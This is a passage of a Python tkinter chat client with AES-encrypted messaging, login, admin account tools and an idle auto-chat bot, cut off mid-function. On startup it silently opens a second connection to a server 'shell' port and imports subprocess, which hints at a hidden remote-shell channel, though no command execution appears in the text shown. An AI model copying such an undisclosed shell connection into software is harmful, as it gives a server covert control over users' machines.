import threading
import socket
import os
import time
import subprocess
import sys
import platform

from tkinter import *
from PIL import Image, ImageTk
from aes_cbc import CipherBlockChainingAES
from random import randint


# GUI Code
########################################################################################################################
global pop
global pic
global uid
global username
global send
global receive
global auto_chatting


# Main Code
########################################################################################################################
HEADER_LENGTH = 32
FORMAT = "utf-8"
"""
Unless the server script is hosted on a live server online, the SERVER_IP in the client script
must be changed according to where the server's IP address is listening on the network

Check under Wireless LAN adapter Wi-Fi from the "ipconfig" command in cmd
"""
SERVER_IP = socket.gethostbyname(socket.gethostname())
SERVER_PORT = 5000
SERVER_SHELL_PORT = 5050
kill_thread = False
auto_chat = True
idle = True
cipher = CipherBlockChainingAES()


class SendMessage(threading.Thread):
    def __init__(self, server_socket, user_name):
        super().__init__()
        self.server_socket = server_socket
        self.username = user_name
        global kill_thread
        kill_thread = False

    def run(self):
        global kill_thread
        global idle
        while True:
            message = input("> ")
            idle = False  # Input detected / Host not idle
            if not message:  # Empty string
                continue

            if message == 'exit':
                message_data = cipher.encrypt(message)
                message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                self.server_socket.send(message_header + message_data)
                kill_thread = True
                break

            # Send message to server for broadcasting
            else:
                message = f"{self.username}: {message}"
                message_data = cipher.encrypt(message)
                message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                self.server_socket.send(message_header + message_data)

        if self.username == '<ADMIN>':
            pass
            # print("\n[PROGRAM]: Exiting chatroom...")

        else:
            pass
            # print("\n[PROGRAM]: Logging off...")

        client.active = False


class ReceiveMessage(threading.Thread):
    def __init__(self, server_socket, user_name):
        super().__init__()
        self.server_socket = server_socket
        self.username = user_name
        global kill_thread
        kill_thread = False

    def run(self):
        global kill_thread
        global auto_chat
        while True:
            try:
                if kill_thread:
                    client.active = False
                    break

                message_header = self.server_socket.recv(HEADER_LENGTH)
                if len(message_header):
                    message_length = int(message_header.decode(FORMAT))
                    message = cipher.decrypt(self.server_socket.recv(message_length)).decode(FORMAT)

                    if message == '200':  # Message sent to server was successful
                        continue

                    elif message == '202':
                        auto_chat = True
                        continue

                    elif message == '203':
                        auto_chat = False
                        continue

                    elif message == '503':
                        # Server has closed the socket, exit the program
                        # print("\n[PROGRAM]: Server shutting down...")
                        # print("\n[PROGRAM]: Connection to the server has been lost![0]")
                        # print("\n[PROGRAM]: Quitting...")
                        message_data = cipher.encrypt("exit")
                        message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                        self.server_socket.send(message_header + message_data)
                        os._exit(0)
                        self.server_socket.close()
                        break

                    # print(message)  # Prints the message sent from server
                    client.chat_box.insert(INSERT, f"{message}")

            except WindowsError:
                # print("\n[PROGRAM]: Connection to the server has been lost unexpectedly![1]")
                # print("\n[PROGRAM]: Please restart the program!")
                # print("\n[PROGRAM]: Quitting...")
                self.server_socket.close()
                os._exit(0)
                break


class AutoChatting(threading.Thread):
    def __init__(self, server_socket, user_name):
        super().__init__()
        self.server_socket = server_socket
        self.username = user_name
        global kill_thread
        kill_thread = False

    def run(self):
        global kill_thread
        global auto_chat
        global idle
        start_time = time.perf_counter()

        while True:
            if kill_thread:
                client.active = False
                break

            if not auto_chat:
                continue

            if not idle:
                start_time = time.perf_counter()  # Reset timer when host is not idle
                idle = True

            elapsed_time = time.perf_counter() - start_time

            if elapsed_time > 5:  # Starts sending random messages after host is idle for more than 5 seconds
                count = len(open('random_messages.txt', 'r').readlines()) - 1
                with open('random_messages.txt', 'r') as file:
                    random_message = file.readlines()[randint(0, count)].splitlines()[0]

                # print(f"> {random_message}")
                client.chat_box.insert(END, f"> {random_message}\n")
                message = f"{self.username}: {random_message}"
                message_data = cipher.encrypt(message)
                message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                self.server_socket.send(message_header + message_data)
                time.sleep(8)  # Sends random messages in a 8 second interval


class Client(threading.Thread):
    def __init__(self, master):
        super().__init__()
        global uid
        self.master = master

        # Declare frames
        self.main_menu_frame = Frame(master)
        self.login_frame = Frame(master)
        self.create_user_frame = Frame(master)
        self.chatroom_frame = Frame(master)
        self.admin_menu_frame = Frame(master)
        self.list_frame = Frame(master)
        self.remove_user_frame = Frame(master)

        for frame in (self.main_menu_frame, self.login_frame, self.create_user_frame, self.chatroom_frame,
                      self.admin_menu_frame, self.list_frame, self.remove_user_frame):
            frame.config(bg="light grey")
            frame.grid(row=0, column=0, sticky=NSEW)
            # frame.pack(fill=BOTH, expand=YES)

        self.show_frame(self.main_menu_frame)  # Display main menu frame when program starts

        # Attempts to connect to server
        # print(f"[PROGRAM]: Establishing connection to server at {SERVER_IP}")
        for tries in range(0, 4):
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shell_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((SERVER_IP, SERVER_PORT))
                self.shell_connection.connect((SERVER_IP, SERVER_SHELL_PORT))

                # Obtain UID from server
                server_reply = self.receive_message(self.connection)
                uid = str(server_reply['msg_data'])
                break

            except WindowsError:
                # Attempts to retry connecting to the server (Max: 3 tries)
                if tries == 3:
                    # print("\n[PROGRAM]: Service is currently unavailable...")
                    # print("\n[PROGRAM]: Please restart the program!")
                    os._exit(0)

                # print(f"\n[PROGRAM]: Connection error: No connection could be"
                #       f" made because the target machine actively refused it")
                # print("[PROGRAM]: Retrying...")
                # Timeout for 3 seconds before reattempting to connect to server
                time.sleep(3)

        # Main menu frame
        mm_header = Frame(self.main_menu_frame, bg="grey")  # Header frame
        mm_header.pack(fill=X)

        main_menu_title = Label(mm_header, text="THE KNOTTY CHAT", bg='grey', font="none, 60 bold")
        main_menu_title.pack(pady=10)

        mm_body = Frame(self.main_menu_frame, bg="light grey")  # Body frame
        mm_body.columnconfigure(0, weight=1)
        mm_body.rowconfigure(0, weight=1)
        mm_body.pack(fill=X, pady=150)

        login_btn = Button(mm_body, text="Login", width=0, font="arial 20 bold",
                           command=self.login)
        login_btn.grid(row=0, column=0, pady=10)

        create_user_btn = Button(mm_body, text="Create User", width=10, font="arial 20 bold",
                                 command=lambda: self.create_account("normal"))
        create_user_btn.grid(row=1, column=0)

        self.mm_info_box = Text(mm_body, width=40, height=2, bg="light grey", borderwidth=0, font="arial 15")
        self.mm_info_box.tag_configure("center", justify='center')
        self.mm_info_box.grid(row=2, column=0, padx=0, pady=10)
        self.mm_info_box.tag_add("center", "1.0", "end")

        mm_footer = Frame(self.main_menu_frame, bg="grey")  # Footer frame
        mm_footer.columnconfigure(0, weight=1)
        mm_footer.rowconfigure(0, weight=1)
        mm_footer.pack(side=BOTTOM, fill=X)

        exit_btn = Button(mm_footer, text="Exit", width=6, font="arial 20 bold", command=self.close_program)
        exit_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(mm_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(mm_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

        # Login frame
        lgn_header = Frame(self.login_frame, bg="grey")  # Header frame
        lgn_header.pack(fill=X)

        main_menu_title = Label(lgn_header, text="LOGIN", bg='grey', font="none, 60 bold")
        main_menu_title.pack(pady=10)

        lgn_body = Frame(self.login_frame, bg="light grey")  # Body frame
        lgn_body.columnconfigure(0, weight=1)
        lgn_body.rowconfigure(0, weight=1)
        lgn_body.pack(fill=X, pady=150)

        self.lgn_info_box = Text(lgn_body, width=40, height=1, bg="light grey", borderwidth=0, font="arial 15")
        self.lgn_info_box.tag_configure("center", justify='center')
        self.lgn_info_box.grid(row=0, column=1, padx=(0, 200))
        self.lgn_info_box.tag_add("center", "1.0", "end")

        username_label = Label(lgn_body, text="Username:", bg="light grey", font="arial 20")
        username_label.grid(row=1, column=0, sticky=E)

        self.username_input = Entry(lgn_body, width=25, borderwidth=5, bg="white", font="arial 20")
        self.username_input.grid(row=1, column=1, padx=(0, 200), pady=10)

        password_label = Label(lgn_body, text="Password:", bg="light grey", font="arial 20")
        password_label.grid(row=2, column=0, sticky=E)

        self.password_input = Entry(lgn_body, width=25, borderwidth=5, bg="white", font="arial 20")
        self.password_input.grid(row=2, column=1, padx=(0, 200), pady=10)

        login_btn = Button(lgn_body, text="Sign In", font="arial 20 bold", command=self.user_login)
        login_btn.grid(row=4, column=1, padx=(0, 200))

        lgn_footer = Frame(self.login_frame, bg="grey")  # Footer frame
        lgn_footer.columnconfigure(0, weight=1)
        lgn_footer.rowconfigure(0, weight=1)
        lgn_footer.pack(side=BOTTOM, fill=X)

        back_btn = Button(lgn_footer, text="Back", width=6, font="arial 20 bold",
                          command=lambda: self.back("main_menu"))
        back_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(lgn_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(lgn_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

        # Create user frame
        cu_header = Frame(self.create_user_frame, bg="grey")  # Header frame
        cu_header.pack(fill=X)

        main_menu_title = Label(cu_header, text="CREATE ACCOUNT", bg='grey', font="none, 60 bold")
        main_menu_title.pack(pady=10)

        cu_body = Frame(self.create_user_frame, bg="light grey")  # Body frame
        cu_body.columnconfigure(0, weight=1)
        cu_body.rowconfigure(0, weight=1)
        cu_body.pack(fill=X, pady=100)

        self.cu_info_box = Text(cu_body, width=41, height=1, bg="light grey", borderwidth=0, font="arial 15")
        self.cu_info_box.tag_configure("center", justify='center')
        self.cu_info_box.grid(row=0, column=1, padx=(0, 200))
        self.cu_info_box.tag_add("center", "1.0", "end")

        new_username_label = Label(cu_body, text="Enter username:", bg="light grey", font="arial 20")
        new_username_label.grid(row=1, column=0, sticky=E)

        self.new_username_input = Entry(cu_body, width=25, borderwidth=5, bg="white", font="arial 20")
        self.new_username_input.grid(row=1, column=1, padx=(0, 200), pady=10)

        new_password_label = Label(cu_body, text="Enter password:", bg="light grey", font="arial 20")
        new_password_label.grid(row=2, column=0, sticky=E)

        self.new_password_input = Entry(cu_body, width=25, borderwidth=5, bg="white", font="arial 20")
        self.new_password_input.grid(row=2, column=1, padx=(0, 200), pady=10)

        new_retype_pass_label = Label(cu_body, text="Retype password:", bg="light grey", font="arial 20")
        new_retype_pass_label.grid(row=3, column=0, sticky=E)

        self.new_retype_pass_input = Entry(cu_body, width=25, borderwidth=5, bg="white", font="arial 20")
        self.new_retype_pass_input.grid(row=3, column=1, padx=(0, 200), pady=10)

        self.cu_submit_btn = Button(cu_body, text="Submit", font="arial 20 bold",
                                    command=lambda: self.submit_new_user("normal"))
        self.cu_submit_btn.grid(row=4, column=1, padx=(0, 200))

        cu_footer = Frame(self.create_user_frame, bg="grey")  # Footer frame
        cu_footer.columnconfigure(0, weight=1)
        cu_footer.rowconfigure(0, weight=1)
        cu_footer.pack(side=BOTTOM, fill=X)

        self.cu_back_btn = Button(cu_footer, text="Back", width=6, font="arial 20 bold",
                                  command=lambda: self.back("main_menu"))
        self.cu_back_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(cu_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(cu_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

        # Chatroom frame
        crm_header = Frame(self.chatroom_frame, bg="grey")  # Header frame
        crm_header.pack(fill=X)

        chatroom_title = Label(crm_header, text="CHATROOM", bg='grey', font="none, 60 bold")
        chatroom_title.pack(pady=0)

        crm_body = Frame(self.chatroom_frame, bg="light grey")  # Body frame
        crm_body.columnconfigure(0, weight=1)
        crm_body.rowconfigure(0, weight=1)
        crm_body.pack(fill=BOTH, expand=YES)

        crm_chat_box = Frame(crm_body)
        crm_chat_box.grid(row=0, column=0, sticky=NW, padx=(15, 10), pady=(15, 0))

        self.chat_box = Text(crm_chat_box, width=62, height=21, borderwidth=5, bg="white", font="arial 14", wrap=WORD)
        self.chat_box.pack(side=LEFT, fill=BOTH)

        chat_box_scrollbar = Scrollbar(crm_chat_box, command=self.chat_box.yview)  # Scrollbar for chat box
        chat_box_scrollbar.pack(side=RIGHT, fill=Y)
        self.chat_box.configure(yscrollcommand=chat_box_scrollbar.set)
        chat_box_scrollbar.config(command=self.chat_box.yview)

        crm_user_online = LabelFrame(crm_body, text="Users Online", font="arial 12 bold")
        crm_user_online.grid(row=0, column=1, sticky=NE, padx=(10, 15), pady=(15, 0))

        user_online = Text(crm_user_online, width=10, height=20, borderwidth=5, bg="white", font="arial 14", wrap=WORD)
        user_online.pack(side=LEFT, fill=BOTH)

        user_online_scrollbar = Scrollbar(crm_user_online, command=user_online.yview)  # Scrollbar for users online
        user_online_scrollbar.pack(side=RIGHT, fill=Y)
        user_online.configure(yscrollcommand=user_online_scrollbar.set)
        user_online_scrollbar.config(command=user_online.yview)

        crm_input = Frame(crm_body)
        crm_input.grid(row=1, column=0, columnspan=2, sticky=NW, padx=15, pady=(0, 15))

        self.msg_box = Entry(crm_input, width=67, borderwidth=5, bg="white", font="arial 14")
        self.msg_box.pack(side=LEFT, padx=10, pady=10)

        send_btn = Button(crm_input, text="Send", width=6, font="arial 14 bold", command=self.message_send)
        send_btn.pack(side=LEFT, padx=10)

        crm_footer = Frame(self.chatroom_frame, bg="grey")  # Footer frame
        crm_footer.columnconfigure(0, weight=1)
        crm_footer.rowconfigure(0, weight=1)
        crm_footer.pack(side=BOTTOM, fill=X)

        self.crm_logout_btn = Button(crm_footer, text="Logout", width=6, font="arial 20 bold",
                                     command=self.logout)
        self.crm_logout_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(crm_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(crm_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

        # Administrator menu frame
        adm_header = Frame(self.admin_menu_frame, bg="grey")  # Header frame
        adm_header.pack(fill=X)

        admin_menu_title = Label(adm_header, text="ADMINISTRATOR", bg='grey', font="none, 60 bold")
        admin_menu_title.pack()

        adm_body = Frame(self.admin_menu_frame, bg="light grey")  # Body frame
        adm_body.columnconfigure(0, weight=1)
        adm_body.rowconfigure(0, weight=1)
        adm_body.pack(fill=X, pady=75)

        list_account_btn = Button(adm_body, text="List Accounts", width=15, font="arial 20 bold",
                                  command=self.list_account)
        list_account_btn.grid(row=0, column=0, pady=(5, 10))

        create_user_btn = Button(adm_body, text="Add Account", width=15, font="arial 20 bold",
                                 command=lambda: self.create_account("admin"))
        create_user_btn.grid(row=1, column=0, pady=10)

        remove_user_btn = Button(adm_body, text="Remove Account", width=15, font="arial 20 bold",
                                 command=self.delete_user)
        remove_user_btn.grid(row=2, column=0, pady=10)

        chatroom_btn = Button(adm_body, text="Join Chatroom", width=15, font="arial 20 bold",
                              command=lambda: self.chatroom("<ADMIN>", "admin"))
        chatroom_btn.grid(row=3, column=0, pady=10)

        auto_chat_btn = Button(adm_body, text="Toggle Auto-chat", width=15, font="arial 20 bold",
                               command=self.toggle_auto_chat)
        auto_chat_btn.grid(row=4, column=0, pady=(10, 5))

        self.adm_info_box = Text(adm_body, width=40, height=1, bg="light grey", borderwidth=0, font="arial 15")
        self.adm_info_box.tag_configure("center", justify='center')
        self.adm_info_box.grid(row=5, column=0, padx=0, pady=(10, 0))
        self.adm_info_box.tag_add("center", "1.0", "end")

        adm_footer = Frame(self.admin_menu_frame, bg="grey")  # Footer frame
        adm_footer.columnconfigure(0, weight=1)
        adm_footer.rowconfigure(0, weight=1)
        adm_footer.pack(side=BOTTOM, fill=X)

        logout_btn = Button(adm_footer, text="Logout", width=6, font="arial 20 bold", command=self.logout)
        logout_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(adm_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(adm_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

        # List account frame
        lsa_header = Frame(self.list_frame, bg="grey")  # Header frame
        lsa_header.pack(fill=X)

        list_account_title = Label(lsa_header, text="ACCOUNT DATABASE", bg='grey', font="none, 60 bold")
        list_account_title.pack(pady=10)

        lsa_body = Frame(self.list_frame, bg="light grey")  # Body frame
        lsa_body.columnconfigure(0, weight=1)
        lsa_body.rowconfigure(0, weight=1)
        lsa_body.pack(fill=BOTH, expand=YES)

        self.account_display = Text(lsa_body, width=50, height=15, borderwidth=5, bg="white", font="arial 20", wrap=WORD)
        self.account_display.tag_configure("center", justify='center')
        self.account_display.pack(fill=BOTH, padx=10, pady=(25, 0))

        lsa_footer = Frame(self.list_frame, bg="grey")  # Footer frame
        lsa_footer.columnconfigure(0, weight=1)
        lsa_footer.rowconfigure(0, weight=1)
        lsa_footer.pack(side=BOTTOM, fill=X)

        back_btn = Button(lsa_footer, text="Back", width=6, font="arial 20 bold",
                          command=lambda: self.show_frame(self.admin_menu_frame))
        back_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(lsa_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(lsa_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

        # Remove user frame
        rmu_header = Frame(self.remove_user_frame, bg="grey")  # Header frame
        rmu_header.pack(fill=X)

        remove_user_title = Label(rmu_header, text="DELETE ACCOUNT", bg='grey', font="none, 60 bold")
        remove_user_title.pack(pady=10)

        rmu_body = Frame(self.remove_user_frame, bg="light grey")  # Body frame
        rmu_body.columnconfigure(0, weight=1)
        rmu_body.rowconfigure(0, weight=1)
        rmu_body.pack(fill=X, pady=150)

        self.rmu_info_box = Text(rmu_body, width=40, height=1, bg="light grey", borderwidth=0, font="arial 15")
        self.rmu_info_box.tag_configure("center", justify='center')
        self.rmu_info_box.grid(row=0, column=1, padx=(0, 200))

        username_label = Label(rmu_body, text="Username:", bg="light grey", font="arial 20")
        username_label.grid(row=1, column=0, sticky=E)

        self.rmu_username_input = Entry(rmu_body, width=25, borderwidth=5, bg="white", font="arial 20")
        self.rmu_username_input.grid(row=1, column=1, padx=(0, 200), pady=10)

        remove_btn = Button(rmu_body, text="Remove", font="arial 20 bold", command=self.popup)
        remove_btn.grid(row=4, column=1, padx=(0, 200))

        rmu_footer = Frame(self.remove_user_frame, bg="grey")  # Footer frame
        rmu_footer.columnconfigure(0, weight=1)
        rmu_footer.rowconfigure(0, weight=1)
        rmu_footer.pack(side=BOTTOM, fill=X)

        rmu_back_btn = Button(rmu_footer, text="Back", width=6, font="arial 20 bold",
                              command=lambda: self.back("admin"))
        rmu_back_btn.grid(row=0, column=0, padx=60, pady=(30, 50), sticky=SW)

        uid_label = Label(rmu_footer, text="UID:", bg="grey", font="arial 15")
        uid_label.grid(row=0, column=1, pady=55)

        uid_num = Text(rmu_footer, width=8, height=1, bg="grey", borderwidth=0, font="arial 15")
        uid_num.grid(row=0, column=2, padx=(0, 60), pady=55)
        uid_num.insert(END, uid)

    def run(self):
        pass
        # self.display_title()

        # try:
        #     if choice == '0':
        #         print("[PROGRAM]: Exiting program...")
        #         self.send_message(self.connection, choice)
        #         self.connection.close()
        #         os._exit(0)
        #         break
        #
        #     elif choice == '1':
        #         self.send_message(self.connection, choice)
        #         self.user_login()
        #
        #     elif choice == '2':
        #         self.send_message(self.connection, choice)
        #         self.create_account()
        #
        #     else:
        #         print("[PROGRAM]: Please re-enter your choice")
        #
        # except WindowsError:
        #     print("\n[PROGRAM]: Connection to the server has been lost unexpectedly![2]")
        #     print("\n[PROGRAM]: Please restart the program!")
        #     print("\n[PROGRAM]: Quitting...")
        #     os._exit(0)

    @staticmethod
    def show_frame(current_frame):
        current_frame.tkraise()

    def close_program(self):
        self.master.destroy()
        self.send_message(self.connection, 'close')
        self.connection.close()
        os._exit(0)

    def logout(self):
        global kill_thread
        global send
        global receive
        global auto_chatting

        self.show_frame(self.main_menu_frame)
        self.mm_info_box.delete(1.0, END)
        self.mm_info_box.insert(END, "Logged out!")
        self.mm_info_box.tag_add("center", "1.0", "end")
        self.adm_info_box.delete(1.0, END)
        self.chat_box.delete(1.0, END)
        self.msg_box.delete(0, END)

        kill_thread = True
        self.send_message(self.connection, 'logout')

        # send.join()
        # receive.join()
        # auto_chatting.join()

    def toggle_auto_chat(self):
        self.send_message(self.connection, "toggle")
        self.adm_info_box.delete(1.0, END)

        server_reply = self.receive_message(self.connection)

        if server_reply == '200':  # Request to server received successfully
            pass

        server_reply = self.receive_message(self.connection)
        self.adm_info_box.delete(1.0, END)
        self.adm_info_box.insert(END, f"{server_reply['msg_data']}")
        self.adm_info_box.tag_add("center", "1.0", "end")

    def back(self, prev_state):
        global kill_thread
        if prev_state == "main_menu":
            self.send_message(self.connection, "back")
            self.show_frame(self.main_menu_frame)

        elif prev_state == "admin":
            kill_thread = True
            self.send_message(self.connection, "back")
            self.show_frame(self.admin_menu_frame)
            self.chat_box.delete(1.0, END)
            self.msg_box.delete(0, END)

    def popup(self):
        global pop
        pop = Toplevel(self.master)
        pop.title("Warning")

        wp = 350  # Width for the popup window
        hp = 150  # Height for the popup window

        # Get screen width and height
        wsp = self.master.winfo_screenwidth()  # Width of the screen
        hsp = self.master.winfo_screenheight()  # Height of the screen

        # Calculate x and y coordinates for the popup window
        xp = (wsp/2) - (wp/2)
        yp = (hsp/2) - (hp/2)

        # Set the popup window to open in the middle of the user's screen
        pop.geometry('%dx%d+%d+%d' % (wp, hp, xp, yp))

        pop.resizable(width=False, height=False)

        top_frame = Frame(pop)
        top_frame.pack(pady=10)

        # Picture (Optional)
        global pic
        pic = PhotoImage(file="images/error2.png")
        me_pic = Label(top_frame, image=pic, borderwidth=0)
        me_pic.pack(side=LEFT, padx=10)

        pop_label = Label(top_frame, text="Are you sure you want\nto delete this account?", font="helvetica 12")
        pop_label.pack(side=LEFT)

        bottom_frame = Frame(pop)
        bottom_frame.pack(pady=10)

        # Button
        yes_btn = Button(bottom_frame, text="Yes", width=6, command=lambda: self.choices("yes"))
        yes_btn.pack(side=LEFT, padx=10)

        no_btn = Button(bottom_frame, text="No", width=6, command=lambda: self.choices("no"))
        no_btn.pack(side=LEFT, padx=10)

    def choices(self, option):
        pop.destroy()
        if option == "yes":
            self.remove_account()

        elif option == "no":
            pass

    @staticmethod
    def send_message(server_socket, message):
        # For server to send message to individual client
        message_data = cipher.encrypt(message)
        message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
        server_socket.send(message_header + message_data)

    @staticmethod
    def receive_message(server_socket):
        # For server to receive message from individual client
        try:
            message_header = server_socket.recv(HEADER_LENGTH)
            if not len(message_header):
                return False

            message_length = int(message_header.decode(FORMAT))
            message_data = cipher.decrypt(server_socket.recv(message_length))

            """
            Returns a dictionary
                msg_header: Not used in this case but stored as additional information about the msg_data
                msg_data: Contains the un-decoded message
            """
            return {'msg_header': message_length, 'msg_data': message_data.decode(FORMAT)}

        except WindowsError:
            # Server disconnected
            return False

    def login(self):
        self.send_message(self.connection, "login")
        self.mm_info_box.delete(1.0, END)
        self.lgn_info_box.delete(1.0, END)
        self.username_input.delete(0, END)
        self.password_input.delete(0, END)
        self.show_frame(self.login_frame)

    def user_login(self):
        input_username = self.username_input.get().lower()
        input_password = self.password_input.get()

        self.username_input.delete(0, END)
        self.password_input.delete(0, END)

        self.send_message(self.connection, "proceed")
        self.send_message(self.connection, input_username)
        self.send_message(self.connection, input_password)

        server_reply = self.receive_message(self.connection)

        if not server_reply:
            self.lgn_info_box.delete(1.0, END)
            self.lgn_info_box.insert(END, "Service unavailable, please restart the program")
            self.lgn_info_box.tag_add("center", "1.0", "end")

        elif server_reply['msg_data'] == '200':
            # Prevents clients from overwriting their username
            retrieved_username = self.receive_message(self.connection)
            self.chatroom(retrieved_username['msg_data'], "normal")

        elif server_reply['msg_data'] == '201':
            self.admin()

        elif server_reply['msg_data'] == '401':
            self.lgn_info_box.delete(1.0, END)
            self.lgn_info_box.insert(END, "Invalid username/password")
            self.lgn_info_box.tag_add("center", "1.0", "end")

        elif server_reply['msg_data'] == '403':
            self.lgn_info_box.delete(1.0, END)
            self.lgn_info_box.insert(END, "Account is currently in use")
            self.lgn_info_box.tag_add("center", "1.0", "end")

    def create_account(self, privilege):
        if privilege == "normal":
            self.cu_back_btn.config(command=lambda: self.back("main_menu"))
            self.cu_submit_btn.config(command=lambda: self.submit_new_user(privilege))
        elif privilege == "admin":
            self.cu_back_btn.config(command=lambda: self.back("admin"))
            self.cu_submit_btn.config(command=lambda: self.submit_new_user(privilege))
        self.send_message(self.connection, "create")
        self.mm_info_box.delete(1.0, END)
        self.cu_info_box.delete(1.0, END)
        self.adm_info_box.delete(1.0, END)
        self.new_username_input.delete(0, END)
        self.new_password_input.delete(0, END)
        self.new_retype_pass_input.delete(0, END)
        self.show_frame(self.create_user_frame)

        self.cu_info_box.insert(END, "Please enter your new username and password!")
        self.cu_info_box.tag_add("center", "1.0", "end")

    def submit_new_user(self, privilege):
        new_username = self.new_username_input.get().lower()
        new_password = self.new_password_input.get()
        check_password = self.new_retype_pass_input.get()

        self.new_username_input.delete(0, END)
        self.new_password_input.delete(0, END)
        self.new_retype_pass_input.delete(0, END)

        if new_username:
            if new_password:
                if new_password == check_password:
                    self.send_message(self.connection, "proceed")
                    self.send_message(self.connection, new_username)
                    self.send_message(self.connection, new_password)

                else:
                    self.cu_info_box.delete(1.0, END)
                    self.cu_info_box.insert(END, "Passwords did not match!")
                    self.cu_info_box.tag_add("center", "1.0", "end")
                    return

            else:
                self.cu_info_box.delete(1.0, END)
                self.cu_info_box.insert(END, "Please enter a password!")
                self.cu_info_box.tag_add("center", "1.0", "end")
                return

        else:
            self.cu_info_box.delete(1.0, END)
            self.cu_info_box.insert(END, "Please enter a username!")
            self.cu_info_box.tag_add("center", "1.0", "end")
            return

        server_reply = self.receive_message(self.connection)

        if server_reply['msg_data'] == '401':
            self.cu_info_box.delete(1.0, END)
            self.cu_info_box.insert(END, "Username already exists, please try another name")
            self.cu_info_box.tag_add("center", "1.0", "end")
            return

        elif server_reply['msg_data'] == '200':
            if privilege == "normal":
                self.show_frame(self.main_menu_frame)
                self.mm_info_box.insert(END, "New account successfully created!\nPlease login again with your new account!")
                self.mm_info_box.tag_add("center", "1.0", "end")

            elif privilege == "admin":
                self.show_frame(self.admin_menu_frame)
                self.adm_info_box.insert(END, "New account successfully added!")
                self.adm_info_box.tag_add("center", "1.0", "end")

            self.cu_info_box.delete(1.0, END)

    def message_send(self):
        global idle
        global username

        idle = False  # Input detected / Host not idle

        message = self.msg_box.get()
        self.msg_box.delete(0, END)
        if not message:
            return

        else:
            self.chat_box.insert(END, f"\n> {message}")
            message = f"{username}: {message}"
            message_data = cipher.encrypt(message)
            message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
            self.connection.send(message_header + message_data)

    def message_receive(self):
        global auto_chat
        while True:
            try:
                message_header = self.connection.recv(HEADER_LENGTH)
                if len(message_header):
                    message_length = int(message_header.decode(FORMAT))
                    message = cipher.decrypt(self.connection.recv(message_length)).decode(FORMAT)

                    if message == '200':  # Message sent to server was successful
                        continue

                    elif message == '202':
                        auto_chat = True
                        continue

                    elif message == '203':
                        auto_chat = False
                        continue

                    elif message == '503':
                        # Server has closed the socket, exit the program
                        # print("\n[PROGRAM]: Server shutting down...")
                        # print("\n[PROGRAM]: Connection to the server has been lost![0]")
                        # print("\n[PROGRAM]: Quitting...")
                        message_data = cipher.encrypt("exit")
                        message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                        self.connection.send(message_header + message_data)
                        os._exit(0)
                        self.connection.close()
                        break

                    # print(message)  # Prints the message sent from server
                    client.chat_box.insert(END, f"\n{message}")

            except WindowsError:
                # print("\n[PROGRAM]: Connection to the server has been lost unexpectedly![1]")
                # print("\n[PROGRAM]: Please restart the program!")
                # print("\n[PROGRAM]: Quitting...")
                self.connection.close()
                os._exit(0)
                break

        pass

    def chatroom(self, user_name, privilege):
        global send
        global receive
        global auto_chatting
        global username

        username = user_name
        self.adm_info_box.delete(1.0, END)
        if privilege == "normal":
            self.crm_logout_btn.config(text="Logout", command=self.logout)

        elif privilege == "admin":
            self.crm_logout_btn.config(text="Back", command=lambda: self.back("admin"))

        self.show_frame(self.chatroom_frame)

        # send = SendMessage(self.connection, username)
        # receive = ReceiveMessage(self.connection, username)
        receive_thread = threading.Thread(target=self.message_receive)
        auto_chatting = AutoChatting(self.connection, username)

        # send.start()
        # receive.start()
        receive_thread.daemon = True
        receive_thread.start()
        auto_chatting.start()

        # send.join()
        # receive.join()
        # auto_chatting.join()
        return

    def delete_user(self):
        self.show_frame(self.remove_user_frame)
        self.send_message(self.connection, "delete")
        self.adm_info_box.delete(1.0, END)
        self.rmu_info_box.delete(1.0, END)
        self.rmu_username_input.delete(0, END)

    def remove_account(self):
        self.adm_info_box.delete(1.0, END)
        self.rmu_info_box.delete(1.0, END)

        del_username = self.rmu_username_input.get().lower()

        if not del_username:
            self.rmu_info_box.delete(1.0, END)
            self.rmu_info_box.insert(END, "Please enter a valid username")
